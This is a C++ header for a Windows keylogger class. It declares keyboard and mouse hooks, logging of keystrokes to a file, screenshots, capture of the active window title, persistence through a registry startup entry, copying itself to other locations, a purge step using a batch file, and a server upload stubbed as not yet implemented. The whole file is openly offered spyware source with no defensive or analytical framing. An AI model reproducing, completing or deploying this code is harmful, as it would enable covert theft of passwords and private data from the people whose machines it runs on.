#ifndef H_KEYLOGGER
#define H_KEYLOGGER

#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>
#include <sstream>

#include "screenshot.h"

//registry key name
#define REGKEY_NAME "keylogger"

//Keyboard codes
#define SC_CTRL 29
#define SC_LSHIFT 42
#define SC_ALT 56
#define SC_RSHIFT 54
#define SC_SPACE 57
#define SC_ENTER 28
#define SC_TAB 15
#define SC_BACKSPACE 14
#define SC_CAPSLOCK 58
#define SC_ESCAPE 1

//key to press in order to destroy the keylogger
#define HOTKEY_PURGE NULL

//folder to store gathered data
#define DATADIR "gathered"

//time interval for contacting the server
#define UPLOAD_DELTA 10

//name of the batch file used for deleting the program
#define BATCH_NAME "cleaner.bat"

//name of the file receiving key strokes
#define KEYSTROKES_FILE "keystrokes.txt"

class KeyLogger {

    public:

	//singleton
    static KeyLogger* getInstance();
    static void releaseInstance();

    //starts listenning
    void listen();

	//ALT state
	bool KeyLogger::isAltDown() { return altDown; }
	void KeyLogger::setAltDown(bool down) { altDown = down; }

	//CTRL state
	bool KeyLogger::isCtrlDown() { return ctrlDown; }
	void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }

	//LEFT SHIFT state
	bool KeyLogger::isLShiftDown() { return lshiftDown; }
	void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
	
	//RIGHT SHIFT state
	bool KeyLogger::isRShiftDown() { return rshiftDown; }
	void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }

	//writes to registry to make the program launch at every startup
	void persist();

	//erases program data
	void purge();

	//loop for standalone usage
	void loop();
	
	//copy the keylogger to another location
	void copySelf(std::string target);

    protected:

    KeyLogger();
    ~KeyLogger();

	void log(std::string text);

	std::string getTimeString();

	std::string screenshot();

	std::string getActiveWindowTitle();

	std::string removeFilespec(std::string path);

	void writeBuffer();

	void upload() {
		//not implemented yet
	}

	static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);

    static KeyLogger* instance;

    bool altDown;
    bool ctrlDown;
    bool lshiftDown;
    bool rshiftDown;

    HHOOK khook, mhook;
	
    std::ofstream logFile;

	std::string programDir;
	std::string programPath;
	std::string programName;

	std::string keyboardBuffer;

	std::string activeWindowTitle;

	time_t lastUpload;
};

#endif // H_KEYLOGGER
